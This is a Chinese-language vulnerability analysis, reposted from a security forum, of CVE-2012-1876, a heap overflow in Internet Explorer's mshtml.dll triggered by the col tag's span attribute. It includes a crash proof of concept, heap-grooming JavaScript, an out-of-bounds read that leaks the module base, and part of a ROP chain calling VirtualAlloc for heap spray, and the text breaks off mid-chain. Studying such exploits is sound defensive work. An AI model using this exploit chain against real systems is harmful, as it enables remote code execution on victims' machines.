> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-265998.htm)

0x01 漏洞信息
---------

### 0x01.1 漏洞简述

*   编号：CVE-2012-1876
*   类型：堆溢出(Heap Overflow)
*   漏洞影响：远程代码执行(RCE)
*   CVSS 2.0：9.3

mshtml.dll中`CTableLayout::CalculateMinMax`函数在循环向缓冲区(堆分配内存)写入数据时，未校验控制循环次数的`<col>`标签`span`属性值，故可通过精心构造`span`属性值造成堆溢出，进而实现RCE。

### 0x01.2 漏洞影响

Microsoft Internet Explorer 6—9，10 Consumer Preview

### 0x01.3 修复方案

[MS12-037](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2012/ms12-037)

0x02 漏洞分析
---------

### 0x02.1 分析环境

*   OS版本：Windows XP Service Pack 3
*   Internet Explorer版本：8.0.6001.18702
*   mshtml.dll版本：8.0.6001.18702

### 0x02.2 详细分析

使用`gflags.exe`为`iexplore.exe`开启页堆：

 

![](upload/attach/202102/817966_KCXX6XXSWWEGXH4.jpg)

 

WinDbg打开`iexplore.exe`后，通过`.childdbg 1`命令启用子进程调试。运行并打开`poc.html`：

```
 
 
          
        
        
        
 <table style="table-layout:fixed"><colgroup><col id="132" width="42765" span="1000"></colgroup><!-- The <col> tag specifies column properties for each column within a <colgroup> element--><!-- width:Specifies the width of a <col> element --><!-- span:Specifies the number of columns a <col> element should span --></table>
   
 
 

```

允许活动内容运行：

 

![](upload/attach/202102/817966_EHF6CPS54KTSQAF.jpg)

 

崩溃点如下：

 

![](upload/attach/202102/817966_B4C53RNBVAAJ45A.jpg)

 

WinDbg重新打开`iexplore.exe`，运行。当子进程创建完成时，`sxe ld mshtml.dll`设置`mshtml.dll`模块加载异常：

 

![](upload/attach/202102/817966_4AZ7TZAXTH27XP4.jpg)

 

模块已加载，可拍摄快照，方便后续分析：

 

![](upload/attach/202102/817966_PD5D695BQYKDBNU.jpg)

 

IDA定位到函数`CTableColCalc::AdjustForCol`引发crash处：

 

![](upload/attach/202102/817966_FVJ4PTVHAA4G4KY.jpg)

 

向上回溯查看`esi`于何处赋值(调用该函数仅`CTableLayout::CalculateMinMax+F55F`一处，故可直接在IDA中定位)：

 

![](upload/attach/202102/817966_VFRS7FXMNKW36N2.jpg)

 

由上图可以看出其值为`[ebx+9Ch]`，该地址处值由何而来需结合WinDbg动态调试以确定。恢复快照至已加载mshtml.dll，`bp 6368CD39`设断于`call CTableColCalc::AdjustForCol`处，成功断下后，查看堆块信息：

 

![](upload/attach/202102/817966_4SEC5PRVT9FVGGX.jpg)

 

再次恢复快照，`bp 6367d7da`于`CTableLayout::CalculateMinMax`起始位置设断，断下后`bp 635D28F6`于`call CImplAry::EnsureSizeWorker`处设断，跟进分析：

 

![](upload/attach/202102/817966_MP53DF5SYQ6J9S6.jpg)

 

可以看出其分配大小确为0x70，之后跟进`mshtml!_HeapRealloc`查看其分配地址：

 

![](upload/attach/202102/817966_QMK5VMEWSUXRRQN.jpg)

 

向上回溯，`edi`指向`ebx+90h`：

 

![](upload/attach/202102/817966_W4XRB8HBYW9GSJQ.jpg)

 

如此一来，`HeapAlloc`函数返回值——即分配堆块地址写入`[ebx+9Ch]`。至此，crash处`edi`由何而来已分析完成。而写入数据为`width*100`(具体计算过程见`CWidthUnitValue::GetPixelWidth`函数)：

 

![](upload/attach/202102/817966_BER3ETXTTZUCJ9K.jpg)

 

crash处`ecx`值为`(width*100)<<4+9`，最终内容要减1：

 

![](upload/attach/202102/817966_HBMDE2QN3C4HAH6.jpg)

* * *

 

上述内容仅是追溯写入位置与写入值如何计算及传递，下面将分析其执行流。

 

`CTableLayout::CalculateMinMax`第一个参数是用于存储`<table>`标签的`CTableLayout`对象：

 

![](upload/attach/202102/817966_4ANA9NA3BYZ6QRU.jpg)

 

而`[ebx+54h]`存储所有`<col>`标签的`<span>`属性值之和(可记为`span_sum`)：

 

![](upload/attach/202102/817966_3F8T8VJ5P66ESY4.jpg)

 

执行到`0x6367D8EF`处，从`ebx+94h`位置取出值，右移2位，与`span_sum`进行比较：

 

![](upload/attach/202102/817966_AQNVDA6M7ZMFRNN.jpg)

 

如上图所示，再经过两次比较，都满足条件才会`call CImplAry::EnsureSizeWorker`。若`span_sum`小于4，则直接分配`0x70`大小堆块；不小于4，则分配`0x1C*span_sum`大小堆块：

 

![](upload/attach/202102/817966_KYYD7M56VXKXC4N.jpg)

 

分配结束后，会向`ebx+98h`位置写入`span_sum`：

 

![](upload/attach/202102/817966_DFB5PA638X38UTY.jpg)

 

向`ebx+94h`位置写入`span_sum<<2`：

 

![](upload/attach/202102/817966_UKK5VG3UTVDQH86.jpg)

 

如此一来，第二次执行`CTableLayout::CalculateMinMax`便不会调用`CImplAry::EnsureSizeWorker`重新分配内存，而是直接使用上次分配堆块进行写入——修改后的`span`属性值大于修改前`span`属性值，以此`span`值作为循环计数，之前分配堆块大小明显无法容纳，此时便会造成堆溢出。

 

下面是打开POC并允许活动内容运行后由`0x6367D7DA`至`0x6368CD39`两次执行流(可使用`wt -l 1 -ns -oR -m mshtml =6367d7da 6368CD39`命令)对比：

 

![](upload/attach/202102/817966_MMY7QPD8MV73N66.jpg)

 

第二次执行不会调用`CImplAry::EnsureSizeWorker`：

 

![](upload/attach/202102/817966_5HQR8QMGN5ZWS4S.jpg)

 

`span`属性值最大为0x3E8(即1000)：

 

![](upload/attach/202102/817966_U9Y2KHAAYCPPYCY.jpg)

### 0x02.3 漏洞利用

分析所用exp如下：

```
    
        
          
 
          <table style="table-layout:fixed"><colgroup><col id="0" width="41" span="9"></colgroup></table>
          <table style="table-layout:fixed"><colgroup><col id="1" width="41" span="9"></colgroup></table>
        ...
          <table style="table-layout:fixed"><colgroup><col id="132" width="41" span="9"></colgroup></table>
 
          
    


```

第一部分用以申请大量内存并填充字符内容进行堆布局：

<table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python"><tbody><tr><td class="gutter">12345678910111213141516171819202122232425262728293031323334353637383940414243</td><td class="code"><code class="python plain">&lt;script language</code><code class="python keyword">=</code><code class="python string">'javascript'</code><code class="python plain">&gt;</code>&nbsp;<code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">var leak_index </code><code class="python keyword">=</code> <code class="python keyword">-</code><code class="python value">1</code><code class="python plain">;</code>&nbsp;<code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">var dap </code><code class="python keyword">=</code> <code class="python string">"EEEE"</code><code class="python plain">;</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">while</code> <code class="python plain">( dap.length &lt; </code><code class="python value">480</code> <code class="python plain">) dap </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">dap;</code>&nbsp;<code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">var padding </code><code class="python keyword">=</code> <code class="python string">"AAAA"</code><code class="python plain">;</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">while</code> <code class="python plain">( padding.length &lt; </code><code class="python value">480</code> <code class="python plain">) padding </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">padding;</code>&nbsp;<code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">var filler </code><code class="python keyword">=</code> <code class="python string">"BBBB"</code><code class="python plain">;</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">while</code> <code class="python plain">( filler.length &lt; </code><code class="python value">480</code> <code class="python plain">) filler </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">filler;</code>&nbsp;<code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">/</code><code class="python keyword">/</code><code class="python plain">spray</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">var arr </code><code class="python keyword">=</code> <code class="python plain">new Array();</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">var rra </code><code class="python keyword">=</code> <code class="python plain">new Array();</code>&nbsp;<code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">var div_container </code><code class="python keyword">=</code> <code class="python plain">document.getElementById(</code><code class="python string">"test"</code><code class="python plain">);</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">div_container.style.cssText </code><code class="python keyword">=</code> <code class="python string">"display:none"</code><code class="python plain">;</code>&nbsp;<code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">for</code> <code class="python plain">(var i</code><code class="python keyword">=</code><code class="python value">0</code><code class="python plain">; i &lt; </code><code class="python value">500</code><code class="python plain">; i</code><code class="python keyword">+</code><code class="python keyword">=</code><code class="python value">2</code><code class="python plain">) {</code>&nbsp;<code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">/</code><code class="python keyword">/</code> <code class="python plain">E</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">rra[i] </code><code class="python keyword">=</code> <code class="python plain">dap.substring(</code><code class="python value">0</code><code class="python plain">, (</code><code class="python value">0x100</code><code class="python keyword">-</code><code class="python value">6</code><code class="python plain">)</code><code class="python keyword">/</code><code class="python value">2</code><code class="python plain">);</code>&nbsp;<code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">/</code><code class="python keyword">/</code> <code class="python plain">S, bstr </code><code class="python keyword">=</code> <code class="python plain">A</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">arr[i] </code><code class="python keyword">=</code> <code class="python plain">padding.substring(</code><code class="python value">0</code><code class="python plain">, (</code><code class="python value">0x100</code><code class="python keyword">-</code><code class="python value">6</code><code class="python plain">)</code><code class="python keyword">/</code><code class="python value">2</code><code class="python plain">);</code>&nbsp;<code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">/</code><code class="python keyword">/</code> <code class="python plain">A, bstr </code><code class="python keyword">=</code> <code class="python plain">B</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">arr[i</code><code class="python keyword">+</code><code class="python value">1</code><code class="python plain">] </code><code class="python keyword">=</code> <code class="python plain">filler.substring(</code><code class="python value">0</code><code class="python plain">, (</code><code class="python value">0x100</code><code class="python keyword">-</code><code class="python value">6</code><code class="python plain">)</code><code class="python keyword">/</code><code class="python value">2</code><code class="python plain">);</code>&nbsp;<code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">/</code><code class="python keyword">/</code> <code class="python plain">B</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">var obj </code><code class="python keyword">=</code> <code class="python plain">document.createElement(</code><code class="python string">"button"</code><code class="python plain">);</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">div_container.appendChild(obj);</code>&nbsp;<code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">}</code>&nbsp;<code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">for</code> <code class="python plain">(var i</code><code class="python keyword">=</code><code class="python value">200</code><code class="python plain">; i&lt;</code><code class="python value">500</code><code class="python plain">; i</code><code class="python keyword">+</code><code class="python keyword">=</code><code class="python value">2</code> <code class="python plain">) {</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">rra[i] </code><code class="python keyword">=</code> <code class="python plain">null;</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">CollectGarbage();</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">}</code>&nbsp;<code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">&lt;</code><code class="python keyword">/</code><code class="python plain">script&gt;</code></td></tr></tbody></table>

其于内存中分布情况(`BSTR 'E'` & `BSTR 'A'` & `BSTR 'B'` & `CButtonLayout`)：

 

![](upload/attach/202102/817966_YZKTNGYPYVJPQCH.jpg)

 

调用`CollectGarbage()`回收完成后，其`Len`部分变为`0x0000ffff`：

 

![](upload/attach/202102/817966_SKJXEDEB664BJJY.jpg)

 

第二部分创建大量`col`标签，以占位之前释放堆块：

<table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python"><tbody><tr><td class="gutter">1234</td><td class="code"><code class="python plain">&lt;table style</code><code class="python keyword">=</code><code class="python string">"table-layout:fixed"</code> <code class="python plain">&gt;&lt;col </code><code class="python functions">id</code><code class="python keyword">=</code><code class="python string">"0"</code> <code class="python plain">width</code><code class="python keyword">=</code><code class="python string">"41"</code> <code class="python plain">span</code><code class="python keyword">=</code><code class="python string">"9"</code> <code class="python plain">&gt;&amp;nbsp &lt;</code><code class="python keyword">/</code><code class="python plain">col&gt;&lt;</code><code class="python keyword">/</code><code class="python plain">table&gt;</code><code class="python plain">&lt;table style</code><code class="python keyword">=</code><code class="python string">"table-layout:fixed"</code> <code class="python plain">&gt;&lt;col </code><code class="python functions">id</code><code class="python keyword">=</code><code class="python string">"1"</code> <code class="python plain">width</code><code class="python keyword">=</code><code class="python string">"41"</code> <code class="python plain">span</code><code class="python keyword">=</code><code class="python string">"9"</code> <code class="python plain">&gt;&amp;nbsp &lt;</code><code class="python keyword">/</code><code class="python plain">col&gt;&lt;</code><code class="python keyword">/</code><code class="python plain">table&gt;</code><code class="python plain">...</code><code class="python plain">&lt;table style</code><code class="python keyword">=</code><code class="python string">"table-layout:fixed"</code> <code class="python plain">&gt;&lt;col </code><code class="python functions">id</code><code class="python keyword">=</code><code class="python string">"132"</code> <code class="python plain">width</code><code class="python keyword">=</code><code class="python string">"41"</code> <code class="python plain">span</code><code class="python keyword">=</code><code class="python string">"9"</code> <code class="python plain">&gt;&amp;nbsp &lt;</code><code class="python keyword">/</code><code class="python plain">col&gt;&lt;</code><code class="python keyword">/</code><code class="python plain">table&gt;</code></td></tr></tbody></table>

之后通过

<table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python"><tbody><tr><td class="gutter">12</td><td class="code"><code class="python plain">var obj_col </code><code class="python keyword">=</code> <code class="python plain">document.getElementById(</code><code class="python string">"132"</code><code class="python plain">);</code><code class="python plain">obj_col.span </code><code class="python keyword">=</code> <code class="python value">19</code><code class="python plain">;</code></td></tr></tbody></table>

完成第一次溢出(可通过条件断点`bp 638209A2 ".if(eax==0x13){};.else{gc;}"`断下后再进一步分析)：

 

![](upload/attach/202102/817966_3VQP9HR39A6EZM3.jpg)

 

而写入位置在每次写入过后会加`0x1C`：

 

![](upload/attach/202102/817966_TV2TAHC8PSY3ESQ.jpg)

 

`0x1C`*`0x12`=`0x1F8`(`0x6368CD4B`处是`jl`命令)，`[EBX+9Ch]+0x1F8+0x18`位置恰为`BSTR 'B'`长度：

 

![](upload/attach/202102/817966_5ZASDCQE3W3XA2C.jpg)

 

之后遍历`arr`数组，长度大于`(0x100-6)/2`元素即为发生溢出位置：

<table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python"><tbody><tr><td class="gutter">12345</td><td class="code"><code class="python keyword">for</code> <code class="python plain">( var i </code><code class="python keyword">=</code> <code class="python value">0</code><code class="python plain">; i &lt; </code><code class="python value">500</code><code class="python plain">; i</code><code class="python keyword">+</code><code class="python keyword">+</code> <code class="python plain">) </code><code class="python plain">{</code><code class="python spaces">&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">( arr[i].length &gt; (</code><code class="python value">0x100</code><code class="python keyword">-</code><code class="python value">6</code><code class="python plain">)</code><code class="python keyword">/</code><code class="python value">2</code> <code class="python plain">) </code><code class="python spaces">&nbsp;&nbsp;</code><code class="python plain">{ </code><code class="python keyword">/</code><code class="python keyword">/</code> <code class="python plain">overflowed</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">leak_index </code><code class="python keyword">=</code> <code class="python plain">i;</code></td></tr></tbody></table>

由于该元素长度已被更改为`0x10048`，那么可以越界读取其后`CButtonLayout`中内容：

<table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python"><tbody><tr><td class="gutter">1</td><td class="code"><code class="python plain">var leak </code><code class="python keyword">=</code> <code class="python plain">arr[i].substring((</code><code class="python value">0x100</code><code class="python keyword">-</code><code class="python value">6</code><code class="python plain">)</code><code class="python keyword">/</code><code class="python value">2</code><code class="python keyword">+</code><code class="python plain">(</code><code class="python value">2</code><code class="python keyword">+</code><code class="python value">8</code><code class="python plain">)</code><code class="python keyword">/</code><code class="python value">2</code><code class="python plain">, (</code><code class="python value">0x100</code><code class="python keyword">-</code><code class="python value">6</code><code class="python plain">)</code><code class="python keyword">/</code><code class="python value">2</code><code class="python keyword">+</code><code class="python plain">(</code><code class="python value">2</code><code class="python keyword">+</code><code class="python value">8</code><code class="python keyword">+</code><code class="python value">4</code><code class="python plain">)</code><code class="python keyword">/</code><code class="python value">2</code><code class="python plain">);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code><code class="python keyword">/</code><code class="python keyword">/</code><code class="python value">0xAE086377</code><code class="python plain">——금捷(</code><code class="python functions">Unicode</code><code class="python plain">)</code></td></tr></tbody></table>

![](upload/attach/202102/817966_QMBU9PUQ4V6QSTR.jpg)

 

转换成十六进制数，减去`CButtonLayout::vftable`相较于基址偏移便得到基址：

<table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python"><tbody><tr><td class="gutter">12</td><td class="code"><code class="python plain">leak_addr </code><code class="python keyword">=</code> <code class="python plain">parseInt( leak.charCodeAt(</code><code class="python value">1</code><code class="python plain">).toString(</code><code class="python value">16</code><code class="python plain">) </code><code class="python keyword">+</code> <code class="python plain">leak.charCodeAt(</code><code class="python value">0</code><code class="python plain">).toString(</code><code class="python value">16</code><code class="python plain">), </code><code class="python value">16</code> <code class="python plain">);</code><code class="python plain">mshtmlbase </code><code class="python keyword">=</code> <code class="python plain">leak_addr </code><code class="python keyword">-</code> <code class="python plain">Number(</code><code class="python value">0x001582b8</code><code class="python plain">);</code></td></tr></tbody></table>

Exp中偏移与笔者环境中所计算偏移不符：

 

![](upload/attach/202102/817966_5RNGBQG6E5WYV4Z.jpg)

 

构造ROP+Shellcode及进行Heap Spray：

<table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python"><tbody><tr><td class="gutter">123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778</td><td class="code"><code class="python plain">function heap_spray()</code><code class="python plain">{</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">CollectGarbage();</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">var heapobj </code><code class="python keyword">=</code> <code class="python plain">new </code><code class="python functions">Object</code><code class="python plain">();</code>&nbsp;<code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">/</code><code class="python keyword">/</code> <code class="python plain">generated with mona.py (mshtml.dll v)</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">function rop_chain(mshtmlbase)</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">{</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">var arr </code><code class="python keyword">=</code> <code class="python plain">[</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">mshtmlbase </code><code class="python keyword">+</code> <code class="python plain">Number(</code><code class="python value">0x00001031</code><code class="python plain">),</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">mshtmlbase </code><code class="python keyword">+</code> <code class="python plain">Number(</code><code class="python value">0x00002c78</code><code class="python plain">),&nbsp;&nbsp;&nbsp; </code><code class="python keyword">/</code><code class="python keyword">/</code> <code class="python plain">pop ebp; retn</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">mshtmlbase </code><code class="python keyword">+</code> <code class="python plain">Number(</code><code class="python value">0x0001b4e3</code><code class="python plain">),&nbsp;&nbsp;&nbsp; </code><code class="python keyword">/</code><code class="python keyword">/</code> <code class="python plain">xchg eax,esp; retn (pivot)</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">mshtmlbase </code><code class="python keyword">+</code> <code class="python plain">Number(</code><code class="python value">0x00352c8b</code><code class="python plain">),&nbsp;&nbsp;&nbsp; </code><code class="python keyword">/</code><code class="python keyword">/</code> <code class="python plain">pop eax; retn</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">mshtmlbase </code><code class="python keyword">+</code> <code class="python plain">Number(</code><code class="python value">0x00001340</code><code class="python plain">),&nbsp;&nbsp;&nbsp; </code><code class="python keyword">/</code><code class="python keyword">/</code> <code class="python plain">ptr to &amp;VirtualAlloc() [IAT]</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">mshtmlbase </code><code class="python keyword">+</code> <code class="python plain">Number(</code><code class="python value">0x00124ade</code><code class="python plain">),&nbsp;&nbsp;&nbsp; </code><code class="python keyword">/</code><code class="python keyword">/</code> <code class="python plain">mov eax,[eax]; retn</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">mshtmlbase </code><code class="python keyword">+</code> <code class="python plain">Number(</code><code class="python value">0x000af93e</code><code class="python plain">),&nbsp;&nbsp;&nbsp; </code><code class="python keyword">/</code><code class="python keyword">/</code> <code class="python plain">xchg eax,esi; </code><code class="python keyword">and</code> <code class="python plain">al,</code><code class="python value">0</code><code class="python plain">; xor eax,eax; retn</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">mshtmlbase </code><code class="python keyword">+</code> <code class="python plain">Number(</code><code class="python value">0x00455a9c</code><code class="python plain">),&nbsp;&nbsp;&nbsp; </code><code class="python keyword">/</code><code class="python keyword">/</code> <code class="python plain">pop ebp; retn</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">mshtmlbase </code><code class="python keyword">+</code> <code class="python plain">Number(</code><code class="python value">0x00128b8d</code><code class="python plain">),&nbsp;&nbsp;&nbsp; </code><code class="python keyword">/</code><code class="python keyword">/</code> <code class="python plain">&amp; jmp esp</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">mshtmlbase </code><code class="python keyword">+</code> <code class="python plain">Number(</code><code class="python value">0x00061436</code><code class="python plain">),&nbsp;&nbsp;&nbsp; </code><code class="python keyword">/</code><code class="python keyword">/</code> <code class="python plain">pop ebx; retn</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python value">0x00000001</code><code class="python plain">,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code><code class="python keyword">/</code><code class="python keyword">/</code> <code class="python value">0x00000001</code><code class="python keyword">-</code><code class="python plain">&gt; ebx</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">mshtmlbase </code><code class="python keyword">+</code> <code class="python plain">Number(</code><code class="python value">0x0052d8a3</code><code class="python plain">),&nbsp;&nbsp;&nbsp; </code><code class="python keyword">/</code><code class="python keyword">/</code> <code class="python plain">pop edx; retn</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python value">0x00001000</code><code class="python plain">,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code><code class="python keyword">/</code><code class="python keyword">/</code> <code class="python value">0x00001000</code><code class="python keyword">-</code><code class="python plain">&gt; edx</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">mshtmlbase </code><code class="python keyword">+</code> <code class="python plain">Number(</code><code class="python value">0x00003670</code><code class="python plain">),&nbsp;&nbsp;&nbsp; </code><code class="python keyword">/</code><code class="python keyword">/</code> <code class="python plain">pop ecx; retn</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python value">0x00000040</code><code class="python plain">,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code><code 